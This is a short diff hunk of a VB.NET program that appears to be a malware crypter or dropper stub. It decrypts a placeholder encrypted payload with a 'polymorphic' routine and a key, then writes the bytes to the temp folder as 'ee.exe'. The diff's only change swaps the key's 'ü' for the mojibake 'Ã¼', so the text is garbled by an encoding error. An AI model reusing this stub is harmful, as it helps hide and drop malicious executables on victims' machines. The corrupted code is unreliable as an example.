@@ -5,7 +5,7 @@ Imports System.Text
 Module Module1
     Sub Main()
         Dim cryptedstr As String = "#+#+#+#+#" '//replace the #+ with the base64
-        Dim key As String = "*Schlüseels*" '//replace *Schlüseels* with the cryptkey
+        Dim key As String = "*SchlÃ¼seels*" '//replace *SchlÃ¼seels* with the cryptkey
         Dim base64code As String = PolyMorphicStairs.PolyDeCrypt(cryptedstr, key) 'decrypts the crypted base64code
         Dim bytes As Byte() = System.Text.Encoding.UTF8.GetBytes(base64code) '//converts the Base64code to a Byte() ( Byte Array )
         IO.File.WriteAllBytes(System.IO.Path.GetTempPath & "ee.exe", bytes) 'write file
